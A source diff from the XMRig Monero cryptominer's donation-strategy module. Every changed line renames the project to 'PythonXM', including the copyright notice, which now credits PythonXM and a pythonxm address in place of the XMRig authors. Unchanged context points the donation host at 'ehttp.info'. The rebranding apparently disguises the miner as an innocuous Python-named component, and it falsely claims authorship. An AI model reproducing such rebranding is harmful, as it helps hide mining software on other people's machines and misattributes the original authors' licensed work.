@@ -1,4 +1,4 @@
-/* XMRig
+/* PythonXM
  * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
  * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
  * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
@@ -6,7 +6,7 @@
  * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
  * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
  * Copyright 2018-2020 SChernykh   <https://github.com/SChernykh>
- * Copyright 2016-2020 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
+ * Copyright 2016-2020 PythonXM       <https://github.com/pythonxm>, <support@pythonxm.com>
  *
  *   This program is free software: you can redistribute it and/or modify
  *   it under the terms of the GNU General Public License as published by
@@ -45,7 +45,7 @@
 #include "net/Network.h"
 
 
-namespace xmrig {
+namespace pythonxm {
 
 static inline double randomf(double min, double max)                 { return (max - min) * (((static_cast<double>(rand())) / static_cast<double>(RAND_MAX))) + min; }
 static inline uint64_t random(uint64_t base, double min, double max) { return static_cast<uint64_t>(base * randomf(min, max)); }
@@ -55,10 +55,10 @@ static const char *kDonateHost = "ehttp.info";
 static const char *kDonateHostTls = "ehttp.info";
 #endif
 
-} /* namespace xmrig */
+} /* namespace pythonxm */
 
 
-xmrig::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener *listener) :
+pythonxm::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener *listener) :
     m_donateTime(static_cast<uint64_t>(controller->config()->pools().donateLevel()) * 60 * 1000),
     m_idleTime((100 - static_cast<uint64_t>(controller->config()->pools().donateLevel())) * 60 * 1000),
     m_controller(controller),
@@ -94,7 +94,7 @@ xmrig::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener 
 }
 
 
-xmrig::DonateStrategy::~DonateStrategy()
+pythonxm::DonateStrategy::~DonateStrategy()
 {
     delete m_timer;
     delete m_strategy;
@@ -105,13 +105,13 @@ xmrig::DonateStrategy::~DonateStrategy()
 }
 
 
-int64_t xmrig::DonateStrategy::submit(const JobResult &result)
+int64_t pythonxm::DonateStrategy::submit(const JobResult &result)
 {
     return m_proxy ? m_proxy->submit(result) : m_strategy->submit(result);
 }
 
 
-void xmrig::DonateStrategy::connect()
+void pythonxm::DonateStrategy::connect()
 {
     m_proxy = createProxy();
     if (m_proxy) {
@@ -124,7 +124,7 @@ void xmrig::DonateStrategy::connect()
 }
 
 
-void xmrig::DonateStrategy::setAlgo(const xmrig::Algorithm &algo)
+void pythonxm::DonateStrategy::setAlgo(const pythonxm::Algorithm &algo)
 {
     m_algorithm = algo;
 
@@ -132,20 +132,20 @@ void xmrig::DonateStrategy::setAlgo(const xmrig::Algorithm &algo)
 }
 
 
-void xmrig::DonateStrategy::setProxy(const ProxyUrl &proxy)
+void pythonxm::DonateStrategy::setProxy(const ProxyUrl &proxy)
 {
     m_strategy->setProxy(proxy);
 }
 
 
-void xmrig::DonateStrategy::stop()
+void pythonxm::DonateStrategy::stop()
 {
     m_timer->stop();
     m_strategy->stop();
 }
 
 
-void xmrig::DonateStrategy::tick(uint64_t now)
+void pythonxm::DonateStrategy::tick(uint64_t now)
 {
     m_now = now;
 
@@ -161,7 +161,7 @@ void xmrig::DonateStrategy::tick(uint64_t now)
 }
 
 
-void xmrig::DonateStrategy::onActive(IStrategy *, IClient *client)
+void pythonxm::DonateStrategy::onActive(IStrategy *, IClient *client)
 {
     if (isActive()) {
         return;
@@ -172,12 +172,12 @@ void xmrig::DonateStrategy::onActive(IStrategy *, IClient *client)
 }
 
 
-void xmrig::DonateStrategy::onPause(IStrategy *)
+void pythonxm::DonateStrategy::onPause(IStrategy *)
 {
 }
 
 
-void xmrig::DonateStrategy::onClose(IClient *, int failures)
+void pythonxm::DonateStrategy::onClose(IClient *, int failures)
 {
     if (failures == 2 && m_controller->config()->pools().proxyDonate() == Pools::PROXY_DONATE_AUTO) {
         m_proxy->deleteLater();
@@ -188,7 +188,7 @@ void xmrig::DonateStrategy::onClose(IClient *, int failures)
 }
 
 
-void xmrig::DonateStrategy::onLogin(IClient *, rapidjson::Document &doc, rapidjson::Value &params)
+void pythonxm::DonateStrategy::onLogin(IClient *, rapidjson::Document &doc, rapidjson::Value &params)
 {
     using namespace rapidjson;
     auto &allocator = doc.GetAllocator();
@@ -210,13 +210,13 @@ void xmrig::DonateStrategy::onLogin(IClient *, rapidjson::Document &doc, rapidjs
 }
 
 
-void xmrig::DonateStrategy::onLogin(IStrategy *, IClient *, rapidjson::Document &doc, rapidjson::Value &params)
+void pythonxm::DonateStrategy::onLogin(IStrategy *, IClient *, rapidjson::Document &doc, rapidjson::Value &params)
 {
     setAlgorithms(doc, params);
 }
 
 
-void xmrig::DonateStrategy::onLoginSuccess(IClient *client)
+void pythonxm::DonateStrategy::onLoginSuccess(IClient *client)
 {
     if (isActive()) {
         return;
@@ -227,25 +227,25 @@ void xmrig::DonateStrategy::onLoginSuccess(IClient *client)
 }
 
 
-void xmrig::DonateStrategy::onVerifyAlgorithm(const IClient *client, const Algorithm &algorithm, bool *ok)
+void pythonxm::DonateStrategy::onVerifyAlgorithm(const IClient *client, const Algorithm &algorithm, bool *ok)
 {
     m_listener->onVerifyAlgorithm(this, client, algorithm, ok);
 }
 
 
-void xmrig::DonateStrategy::onVerifyAlgorithm(IStrategy *, const  IClient *client, const Algorithm &algorithm, bool *ok)
+void pythonxm::DonateStrategy::onVerifyAlgorithm(IStrategy *, const  IClient *client, const Algorithm &algorithm, bool *ok)
 {
     m_listener->onVerifyAlgorithm(this, client, algorithm, ok);
 }
 
 
-void xmrig::DonateStrategy::onTimer(const Timer *)
+void pythonxm::DonateStrategy::onTimer(const Timer *)
 {
     setState(isActive() ? STATE_WAIT : STATE_CONNECT);
 }
 
 
-xmrig::IClient *xmrig::DonateStrategy::createProxy()
+pythonxm::IClient *pythonxm::DonateStrategy::createProxy()
 {
     if (m_controller->config()->pools().proxyDonate() == Pools::PROXY_DONATE_NONE) {
         return nullptr;
@@ -271,13 +271,13 @@ xmrig::IClient *xmrig::DonateStrategy::createProxy()
 }
 
 
-void xmrig::DonateStrategy::idle(double min, double max)
+void pythonxm::DonateStrategy::idle(double min, double max)
 {
     m_timer->start(random(m_idleTime, min, max), 0);
 }
 
 
-void xmrig::DonateStrategy::setAlgorithms(rapidjson::Document &doc, rapidjson::Value &params)
+void pythonxm::DonateStrategy::setAlgorithms(rapidjson::Document &doc, rapidjson::Value &params)
 {
     using namespace rapidjson;
     auto &allocator = doc.GetAllocator();
@@ -298,7 +298,7 @@ void xmrig::DonateStrategy::setAlgorithms(rapidjson::Document &doc, rapidjson::V
 }
 
 
-void xmrig::DonateStrategy::setJob(IClient *client, const Job &job, const rapidjson::Value &params)
+void pythonxm::DonateStrategy::setJob(IClient *client, const Job &job, const rapidjson::Value &params)
 {
     if (isActive()) {
         m_listener->onJob(this, client, job, params);
@@ -306,13 +306,13 @@ void xmrig::DonateStrategy::setJob(IClient *client, const Job &job, const rapidj
 }
 
 
-void xmrig::DonateStrategy::setResult(IClient *client, const SubmitResult &result, const char *error)
+void pythonxm::DonateStrategy::setResult(IClient *client, const SubmitResult &result, const char *error)
 {
     m_listener->onResultAccepted(this, client, result, error);
 }
 
 
-void xmrig::DonateStrategy::setState(State state)
+void pythonxm::DonateStrategy::setState(State state)
 {
     constexpr const uint64_t waitTime = 3000;
 
